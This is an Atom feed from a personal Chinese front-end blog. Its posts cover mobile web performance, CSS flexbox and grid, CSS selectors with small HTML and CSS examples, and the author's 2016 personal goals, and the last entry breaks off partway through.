<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zchub&#39;blog</title>
  <subtitle>FE | CQ@China</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zchub.cn/"/>
  <updated>2016-03-21T09:52:03.936Z</updated>
  <id>http://zchub.cn/</id>
  
  <author>
    <name>Rivers</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>移动端web思考</title>
    <link href="http://zchub.cn/2016/01/19/%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E6%80%9D%E8%80%83/"/>
    <id>http://zchub.cn/2016/01/19/移动端web思考/</id>
    <published>2016-01-19T07:56:29.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##问题&lt;br&gt;做移动端也已经快两个月了，东西不能算是学得很多,而且也没有着手项目，主要负责的是活动的开发，我们主要是在微信开发，然后app中植入h5页面。所以，期间对webapp最大的感受就是页面内容比较少，但是设计到兼容性的比较多。&lt;/p&gt;
&lt;p&gt;这当中有几个问题。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;1.图片大小，太大如何解决&lt;/p&gt;
&lt;p&gt;一走来，便是切图。各种jpng－&amp;gt;png（为了消除背景，说实话，自己也挺笨的，开发了几个后才知道如何做！不知道之前是怎么搞的），然后便是使用压缩软件，（虽然gulp有压缩图片的功能）。但是公司使用的是cdn，需要上传。这个便是让我蛋疼的地方。但凡每次运营改了东西，都要经过好多个步骤才能shut down。（现在也没想到好的办法！）&lt;/p&gt;
&lt;p&gt;另外一个就是图片大小的问题了，图片太大，对于移动端来说下载时间久，渲染通过cpu时间也长。 不过webp格式的图片，压缩率也挺不错（目前还在活动中使用），它在chrome上完美支持，但是还有其他的缺点。&lt;/p&gt;
&lt;p&gt;=======update=====&lt;br&gt;目前的一些方式&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;图片格式&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;浏览器支持&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;使用场景&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;优点&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;webp&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;Chrome9+、Opera11.5、Android4+&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;复杂颜色及形状&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;相比png缩减了文件大小&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;svg&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有(IE8以上-不包括IE8)&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;复杂颜色及形状&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;简单图形，需要良好的放缩体验，需要动态控制图片特效&lt;/td&gt;
&lt;td&gt;矢量图片，不受像素支持&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;bgp&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;不支持，需要js解码&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;jpeg上需要极限优化的场景&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;高压缩比，相同画质比webp更小&lt;/td&gt;
&lt;td&gt;jpeg上需要极限优化的场景&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;看来svg+canvas是一种良好的解决方案&lt;/p&gt;
&lt;p&gt;2.页面如何自适应&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;目前手机款式太多，使用相应式不太现实。那么多数应该喝网上taobao移动端的解决方式应该差不多，都是通过rem来进行自适应，并监听viewport大小改变重现设置html的font-size。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.开发类似活动等‘简单’页面，你打算采用什么？框架太重！原生？react？没必要&lt;/p&gt;
&lt;p&gt;reactjs在前端如日中天，这款UI组件库，确实比较牛逼。相对于之前的重量级ng学习成本低一点，但是我感觉一点也不简单。而且在开发活动中，我并没有体会到它的亮点。一个页面，几张图片，一两个按钮，确实有点大材小用。&lt;/p&gt;
&lt;p&gt;之前使用react代码的行数差不多19000+，（惊呆了）所以，最近，我们打算不使用这个来开发活动页面。还是重归zepto的怀抱，目前就（3000+行，大瘦身）。&lt;/p&gt;
&lt;p&gt;======update 2016/3/3=======&lt;br&gt;最近在看新人文档中，看到了天猫开发活动（同事是阿里的）的相关流程。&lt;/p&gt;
&lt;p&gt;每个公司在发展到一定阶段，随着工作的重复和需求量增加，我们伟大的技术童鞋都会有解决方式。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TMS －－》基于php的模块搭建系统 －－》快速活动搭建平台 和 数据投放系统
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个肯定也是我们前端的发展趋势，毕竟切图很累（切身感受）&lt;/p&gt;
&lt;p&gt;4.如何在项目中提高web的性能&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.静态文件放在cdn,至于.html可以放在ngnix上

2.dns预解析

    也是前几天才听说，最近看《移动首屏优化实践》又见到了。

    ￼&amp;lt;meta http-equiv=&amp;quot;x-dns-prefetch-control&amp;quot; content=&amp;quot;on&amp;quot; /&amp;gt; 
     &amp;lt;link rel=&amp;quot;dns-prefetch&amp;quot; href=&amp;quot;//imagecache.qq.com&amp;quot;&amp;gt; 

3.webpack压缩js,css

4.缓存数据
    &amp;amp;emsp;&amp;amp;emsp;目前没有使用过

5.按需加载资源，预加载

6.图片懒加载
    使用了一次别人写的，感觉计算的方式有问题，不是很好。自己学会实现一个。

7.用户体验－进度条，旋转的菊花，都是很好的
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=======update(1/21)=====&lt;br&gt;1.使用node来降低首屏时间&lt;br&gt;后台不一定需要使用node，但是如果设计到数据交互，需要取后台数据。那么我们通过node“直出”来加快显示，这样就不用渲染直接返回。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://web.jobbole.com/84753/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://web.jobbole.com/84753/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://imweb.io/topic/568b20194c44bcc56092e415&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;图片详细介绍&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##问题&lt;br&gt;做移动端也已经快两个月了，东西不能算是学得很多,而且也没有着手项目，主要负责的是活动的开发，我们主要是在微信开发，然后app中植入h5页面。所以，期间对webapp最大的感受就是页面内容比较少，但是设计到兼容性的比较多。&lt;/p&gt;
&lt;p&gt;这当中有几个问题。&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
  </entry>
  
  <entry>
    <title>css3-flex-grid</title>
    <link href="http://zchub.cn/2016/01/16/css3-flex-grid/"/>
    <id>http://zchub.cn/2016/01/16/css3-flex-grid/</id>
    <published>2016-01-16T00:05:01.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;h2 id=&quot;css3-flex&quot;&gt;&lt;a href=&quot;#css3-flex&quot; class=&quot;headerlink&quot; title=&quot;css3-flex&quot;&gt;&lt;/a&gt;css3-flex&lt;/h2&gt;&lt;p&gt;弹性盒子自找工作的时候才知道这个名词，但是并没有怎么深入。今天打算好好研究一下，同时关注一下css3(4)的栅栏布局grid，貌似更强大。&lt;/p&gt;
&lt;p&gt;主流的浏览器大多是支持的，    而现在开发移动端web,android4.4以上也是完全支持的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot; alt=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;##flex专业名词&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flex item&lt;br&gt;flex子类条目&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;flex-item长度的计算&lt;/p&gt;
&lt;p&gt;下面是关于flex-grow、flex-shrink、flex-basis等三个属性在不同值下对应的flex-item的宽度&lt;br&gt;的在线demo，多玩几次就明白了。&lt;br&gt;&lt;a href=&quot;http://madebymike.com.au/demos/flexbox-tester/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://madebymike.com.au/demos/flexbox-tester/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flex-grow&lt;br&gt;默认值：0  继承性：无&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置或检索弹性盒的扩展比率。根据弹性盒子元素所设置的扩展因子作为比率来分配&lt;b&gt;剩余空间&lt;/b&gt;。&lt;br&gt;(PS：一般是 (父容器.width－所有子items.width) / items.length + item.length[每个item的长度])&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;flex-basis&lt;br&gt;语法： flex-basis：&lt;length&gt; | &lt;percentage&gt; | auto | content&lt;br&gt;auto：无特定宽度值，取决于其它属性值&lt;br&gt;content：基于内容自动计算宽度,这样情况item为0px&lt;/percentage&gt;&lt;/length&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flex-shrink&lt;br&gt;value: number(&amp;gt;0)&lt;br&gt;定义收缩比率，根据设置值来收缩空间，同时元素始终在父元素内部&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flex-direction&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;定义弹性子条目的方向&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.container {
  flex-direction: row[行] | row-reverse | column[列] | column-reverse;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;flex-wrap&lt;br&gt;  当items出现一行放不下的情况，这个属性就有效了。&lt;/p&gt;
&lt;p&gt;  .container{&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex-wrap: nowrap[默认值,受元素定义的书写方向的影响] | wrap | wrap-reverse;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;  }&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;justify-content&lt;br&gt;  这个属性作用还是挺大的。&lt;br&gt;  调整内容，帮助元素分配剩余空间。当不是所有的子条目都在同一方向上并且都不是弹性的，或者是弹性但是已经达到他们的最大值。&lt;/p&gt;
&lt;p&gt;  .container {&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;justify-content: flex-start | flex-end | center(水平均匀分布) | space-between | space-around;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;  }&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;align-item[另外一个重点]&lt;br&gt;  弹性子元素如何在当前垂直线上分布。&lt;br&gt;  .container {&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;align-items: flex-start | flex-end | center(垂直均匀) | baseline | stretch;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;  }&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flex&lt;br&gt;  flex是flex-grow, [flex-shrink] 和 [flex-basis]的缩写。默认值为 0 1 auto&lt;br&gt;  即我们使用来设置容器为弹性盒子。&lt;br&gt;  .item {&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex: none | [ &amp;lt;&amp;apos;flex-grow&amp;apos;&amp;gt; &amp;lt;&amp;apos;flex-shrink&amp;apos;&amp;gt;? || &amp;lt;&amp;apos;flex-basis&amp;apos;&amp;gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;  }&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##优点&lt;br&gt;自适应各种屏幕&lt;/p&gt;
&lt;p&gt;##缺点&lt;br&gt;一维的，只能在同一方向上进行布局，所以就水平（horizontal）和垂直两个方向&lt;/p&gt;
&lt;p&gt;##使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;xx{
    display: flex;||
    display: inline-flex;(类比inline-block)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里将容器设置为弹性盒子，而它的内部的&lt;b&gt;所有元素&lt;/b&gt;就变为了弹性子元素&lt;/p&gt;
&lt;p&gt;##注意点&lt;br&gt;弹性盒子的布局逻辑&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 多列布局 中的column-*属性对弹性子元素无效。
* float 和 clear 对弹性子元素无效。使用 float 会导致 display 属性计算为 block.
* vertical-align 对弹性子元素的对齐无效。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##Demo&lt;/p&gt;
&lt;p&gt;1.水平垂直居中（简直了）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.vertical-container {
      height: 300px;
      display: -webkit-flex;
      display: flex;
      -webkit-align-items: center;
      align-items: center;
      -webkit-justify-content: center;
      justify-content: center;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##Grid layout&lt;br&gt;Grid 表格布局 二维布局 相比flex可以对两个方向同时设置，但是浏览器对其支持目前不是很好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse_grid.png&quot; alt=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse_grid.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;正是由于是二维的，所以我们可以定义行(row)、列(column). 感觉有点类似栅栏布局，不知道bootstrap是不是也是这种思想。&lt;/p&gt;
&lt;p&gt;由于网格容器不是块容器，所以部分属性会失效。类似于flex&lt;/p&gt;
&lt;p&gt;###术语&lt;br&gt;1.网格容器(Grid containers)&lt;br&gt;    value: grid || inline-gird&lt;/p&gt;
&lt;p&gt;2.网格轨道(Grid Track)&lt;br&gt;    两条相邻的平行网格线中间的区域，就是行（column）与列(row)。可以用来控制高度与宽度。&lt;/p&gt;
&lt;p&gt;3.网格线(Grid Lines)&lt;br&gt;    用于来规划网格，起到单元化的作用&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;‘fr’    （fraction of available space）&lt;br&gt; 即所有剩余以设置的元素宽度达到最大后的剩余宽度，网格容器中额外空间&lt;br&gt; 类似flexbox的box&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;5.grid-row-span/grid-column-span&lt;/p&gt;
&lt;p&gt;6.grid-template［网格模板］ &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;允许通过模板定义网格。
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;grid item(类比flex-item)&lt;br&gt; 都是容器内的单元内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;分层:z-index&lt;br&gt; 在重叠分部分通过z-index来分层&lt;br&gt;##优点&lt;br&gt;让布局(css)和标记语言(html)真正地分离&lt;/p&gt;
&lt;p&gt; 网格完全是用css定义的。同时它的子类都不需要重新去定义区域，类名或id。目的轻量、易懂。更关键的是我们不会因为样式破坏其他的布局，现在是越来越期待了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;https://2r4s9p1yi1fa2jd7j43zph8r-wpengine.netdna-ssl.com/files/2015/09/1-zcOcwuBtMoBaUfHHAJPNyg2.png&quot; alt=&quot;https://2r4s9p1yi1fa2jd7j43zph8r-wpengine.netdna-ssl.com/files/2015/09/1-zcOcwuBtMoBaUfHHAJPNyg2.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;同时我们还可以使用媒体查询来响应设备&lt;/p&gt;
&lt;p&gt;##学习资料&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Using_CSS_flexible_boxes&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Using_CSS_flexible_boxes&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://css-tricks.com/snippets/css/a-guide-to-flexbox/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://css-tricks.com/snippets/css/a-guide-to-flexbox/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://segmentfault.com/a/1190000002437544&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000002437544&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://css-tricks.com/snippets/css/complete-guide-grid/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://css-tricks.com/snippets/css/complete-guide-grid/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://hacks.mozilla.org/2015/09/the-future-of-layout-with-css-grid-layouts/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://hacks.mozilla.org/2015/09/the-future-of-layout-with-css-grid-layouts/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.css88.com/book/css/properties/flex&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.css88.com/book/css/properties/flex&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;css3-flex&quot;&gt;&lt;a href=&quot;#css3-flex&quot; class=&quot;headerlink&quot; title=&quot;css3-flex&quot;&gt;&lt;/a&gt;css3-flex&lt;/h2&gt;&lt;p&gt;弹性盒子自找工作的时候才知道这个名词，但是并没有怎么深入。今天打算好好研究一下，同时关注一下css3(4)的栅栏布局grid，貌似更强大。&lt;/p&gt;
&lt;p&gt;主流的浏览器大多是支持的，    而现在开发移动端web,android4.4以上也是完全支持的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot; alt=&quot;http://7xklhg.com1.z0.glb.clouddn.com/caniuse-flex.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="front-end" scheme="http://zchub.cn/categories/front-end/"/>
    
    
      <category term="css3" scheme="http://zchub.cn/tags/css3/"/>
    
  </entry>
  
  <entry>
    <title>我的2016</title>
    <link href="http://zchub.cn/2016/01/06/newyeargoal_2016/"/>
    <id>http://zchub.cn/2016/01/06/newyeargoal_2016/</id>
    <published>2016-01-06T21:25:28.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;曾记得2014也冲动过一次，写下了2014想要完成的目标，但是后来那张纸缺不见了，但是那些目标中还是完成了几个的。现在在新的一年，写下自己的目标，踏踏实实滴过好每一天。&lt;/p&gt;
&lt;h4 id=&quot;人丑当然多读书&quot;&gt;&lt;a href=&quot;#人丑当然多读书&quot; class=&quot;headerlink&quot; title=&quot;人丑当然多读书&quot;&gt;&lt;/a&gt;人丑当然多读书&lt;/h4&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;自小不是一个喜欢看书的人，但是为了假装自己有内涵，还是要多看看，不过想看的却不知道哪些。上次，为了提高英文阅读水平，买了本《傲慢与偏见》，发现根本看不懂，看来还是中文适合我。&lt;br&gt;想想列下我自己想看的，&lt;/p&gt;
&lt;p&gt;=====update====&lt;br&gt;最近发现读英文资料，自己的水平上升了呀！（被逼的感觉真好）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;平凡的世界（只看了一点点，遗憾）&lt;br&gt;====update====&lt;br&gt;  已经看完两册&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;读史使人明智&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;身体是革命的本钱&quot;&gt;&lt;a href=&quot;#身体是革命的本钱&quot; class=&quot;headerlink&quot; title=&quot;身体是革命的本钱&quot;&gt;&lt;/a&gt;身体是革命的本钱&lt;/h4&gt;&lt;p&gt;作为上班族，每天坐的的时间太长，不想以后老的时候各种病。现在逼逼自己，尽量保持健康的作息时间（有时候还是做不到），而且在keep中看到其他各种秀身材，自己也难免冲动。&lt;/p&gt;
&lt;h4 id=&quot;关于前端&quot;&gt;&lt;a href=&quot;#关于前端&quot; class=&quot;headerlink&quot; title=&quot;关于前端&quot;&gt;&lt;/a&gt;关于前端&lt;/h4&gt;&lt;p&gt;在这个前端如日中天的季节，前端越是发展的迅猛，我越不知道改如何下手。虽然如今就写写页面 :(。夯实基础，各种html4,css2,dom,js基础。&lt;/p&gt;
&lt;h4 id=&quot;有机会参加马拉松&quot;&gt;&lt;a href=&quot;#有机会参加马拉松&quot; class=&quot;headerlink&quot; title=&quot;有机会参加马拉松&quot;&gt;&lt;/a&gt;有机会参加马拉松&lt;/h4&gt;&lt;p&gt;现在上班都是在锻炼，骑车或walk&lt;/p&gt;
&lt;p&gt;======update 2016/3/3=======&lt;br&gt;已经报名悦跑圈的3月线上10公里，小鸡冻&lt;/p&gt;
&lt;h4 id=&quot;登泰山&quot;&gt;&lt;a href=&quot;#登泰山&quot; class=&quot;headerlink&quot; title=&quot;登泰山&quot;&gt;&lt;/a&gt;登泰山&lt;/h4&gt;&lt;p&gt;登泰山而小天下，虽然生活在丘陵地带，但是还是想要一睹泰山的雄伟。这个应该是毕业之后的事了。&lt;/p&gt;
&lt;h4 id=&quot;看海-done&quot;&gt;&lt;a href=&quot;#看海-done&quot; class=&quot;headerlink&quot; title=&quot;看海(done)&quot;&gt;&lt;/a&gt;看海(done)&lt;/h4&gt;&lt;p&gt;一个人静静旳听的歌，学会享受孤独，看云卷云舒，同时浪花开在脚丫间，想想都觉得开心。(去海南嗨了一波)&lt;/p&gt;
&lt;p&gt;同时希望自己保持这种势头，没什么是大不了的。学会正确滴看待自己。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;曾记得2014也冲动过一次，写下了2014想要完成的目标，但是后来那张纸缺不见了，但是那些目标中还是完成了几个的。现在在新的一年，写下自己的目标，踏踏实实滴过好每一天。&lt;/p&gt;
&lt;h4 id=&quot;人丑当然多读书&quot;&gt;&lt;a href=&quot;#人丑当然多读书&quot; class=&quot;headerlink&quot; title=&quot;人丑当然多读书&quot;&gt;&lt;/a&gt;人丑当然多读书&lt;/h4&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="life" scheme="http://zchub.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>第二章－选择器</title>
    <link href="http://zchub.cn/2016/01/06/css%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97_%E9%80%89%E6%8B%A9%E5%99%A8/"/>
    <id>http://zchub.cn/2016/01/06/css权威指南_选择器/</id>
    <published>2016-01-06T20:17:42.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;我认为css的选择器目的就是我们提供了一个快捷的方式，而我们常用的无非就是元素、类、ID等几种选择器，而其他的几种使用的真的是不多。但是在有的情况下使用这些选择器，你会发现效率大大提高。&lt;/p&gt;
&lt;p&gt;(PS: 尼玛，才发现之前写过总结过一次)&lt;/p&gt;
&lt;h4 id=&quot;选择器种类&quot;&gt;&lt;a href=&quot;#选择器种类&quot; class=&quot;headerlink&quot; title=&quot;选择器种类&quot;&gt;&lt;/a&gt;选择器种类&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;元素选择器&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#css代码
div{background:#ccc;}
zc{background:#ccc;}

#html代码
&amp;lt;div&amp;gt;
    &amp;lt;span&amp;gt;这是一段文字&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;zc&amp;gt;这是自定义标签&amp;lt;/zc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;展示如下&lt;/b&gt;&lt;/p&gt;
&lt;zc style=&quot;background:#ccc;display:border;&quot;&gt;这是自定义标签&lt;/zc&gt;

&lt;div style=&quot;background:#ccc&quot;&gt;&lt;span&gt;这是一段文字&lt;/span&gt;&lt;/div&gt;

&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;通常这么使用的话，&lt;span style=&quot;color:red&quot;&gt;整个页面的div&lt;/span&gt;元素都会有1个灰色的背景。&lt;br&gt;这里，我貌似重新定义了一个标签 &lt;b&gt;zc&lt;/b&gt;,并且还对它设置了样式，但是在查看源码时可以看到是把它放到p标签中，浏览器是把它当作了两个标签解析。&lt;/p&gt;
&lt;p&gt;那如何来定义呢？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html xmlns:zc&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;style&amp;gt;
            zc{background:#ccc;}
        &amp;lt;/style&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;zc&amp;gt;自定义标签&amp;lt;/zc&amp;gt;    
        &amp;lt;zc&amp;gt;自定义标签&amp;lt;/zc&amp;gt;    
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过这种方式，浏览器就会解析标签，并解析为行内元素。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类选择器&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#css样式
div.zc{
    border:1px solid #ccc;
}

#html代码
&amp;lt;div class=&amp;quot;zc&amp;quot;&amp;gt;类选择器&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样则可以定义所有class为zc的div元素了！通常我们定义同种样式的时候使用得较多，如商品详情页中的每个商品。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ID选择器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#css样式
div.zc{
    border:1px solid #ccc;
}

#html代码
&amp;lt;div id=&amp;quot;zc&amp;quot;&amp;gt;id选择器1&amp;lt;/div&amp;gt;    
&amp;lt;div id=&amp;quot;zc&amp;quot;&amp;gt;id选择器2&amp;lt;/div&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开始以为浏览器只会渲染第一个，但是通过实验。发现以上两个都被渲染。看来浏览器在解析的时候直接通过&lt;b&gt;zc&lt;/b&gt;来查找，但是通过HTML DOM就只会返回第一个 id=’zc’的DOM元素.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;属性选择器&lt;br&gt;属性选择器是对指定的属性来进行设置，如果html元素中有改元素，则work&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#style
[demo]}{
    color: #E9967A;
    font-size: 14px;
    font-family: serif;
}

.zc{
    border: 1px solid #00008B;
}

#html
&amp;lt;div class=&amp;quot;zc&amp;quot; demo=&amp;apos;class&amp;apos;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div id=&amp;quot;zc&amp;quot; demo=&amp;apos;id&amp;apos;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;style&gt;
    .zc-attr [demo]{
        color: #E9967A;
        font-size: 14px;
        font-family: serif;
    }
    .zc-attr .zc{
        border: 1px solid #00008B;
    }

    .zc-attr span{
        color: blue;
    }
&lt;/style&gt;
&lt;div class=&quot;zc-attr&quot;&gt;
    &lt;span id=&quot;zc&quot; demo=&quot;id&quot;&gt;这是id为zc的元素&lt;/span&gt;&lt;br&gt;
    &lt;span class=&quot;zc&quot; demo=&quot;class&quot;&gt;这是class为zc的元素 &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span&gt;这是在class内部，没有demo属性的元素&lt;/span&gt;&lt;/span&gt;
&lt;/div&gt;

可见属性选择器只关心html元素中是否包含该属性。当然每个选择器都可以与其他选择器一起使用，达到更好的筛选效果。

其中，比较高级的就是结合正则表达式来选择元素，设置样式。

*

html其中比较有意思的地方就是层次结构，类比“树”!

![http://7xklhg.com1.z0.glb.clouddn.com/html-tree.png](http://7xklhg.com1.z0.glb.clouddn.com/html-tree.png)

结构是以html作为根节点，以后每个元素有可能是另一个元素的子元素或者父元素。而且这张图对我理解后面的几种选择器也是大有帮组。


* 后代选择器

&lt;del&gt;顾名思义，就是获得了一个元素所有的后代的权限可以来设置样式。&lt;/del&gt;

错了，其实是浏览器从左到右来筛选元素。


        =====style=======
        div #zc{
            color: #6495ED;
        }
        p #zc{
            color: #00FFFF;
        }

        =====html========
        &lt;div&gt;
            &lt;span id=&quot;zc&quot;&gt;demo-div&lt;/span&gt;
        &lt;/div&gt;
        &lt;p&gt;
            &lt;span id=&quot;zc&quot;&gt;demo-p&lt;/span&gt;
        &lt;/p&gt;


&lt;style&gt;
        div.demo #zc{
            color: #6495ED;
        }
        p.demo #zc{
            color: #00FFFF;
        }

